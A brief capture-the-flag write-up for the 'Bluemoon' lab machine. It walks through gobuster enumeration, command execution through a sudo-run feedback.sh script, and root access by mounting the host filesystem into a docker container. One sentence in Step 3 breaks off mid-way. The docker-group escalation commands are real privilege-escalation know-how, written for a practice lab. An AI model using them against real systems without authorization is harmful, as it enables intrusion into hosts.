# Bluemoon CTF Write-up

## Objective
The goal of this assignment was to gain root access to the Bluemoon machine.

## Step 1 - Enumeration
First, directory enumeration was performed using Gobuster.

gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt

## Step 2 - Command Injection
The feedback.sh script allowed command execution.

sudo -u jerry ./feedback.sh

Using this vulnerability, commands like the following were executed:

whoami
id

This revealed that the user **jerry** belongs to the **docker group**.

## Step 3 - Docker Privilege Escalation
Because jerry was in the docker group, a container could be started and the 
docker run -v /:/mnt -it alpine sh

## Step 4 - Accessing Host Filesystem
Inside the container, the host filesystem was accessible through /mnt.

ls /mnt

Then the root directory was accessed:

cd /mnt/root

## Step 5 - Root Flag
The root flag was retrieved with:

cat root.txt

This confirmed full root access to the machine.

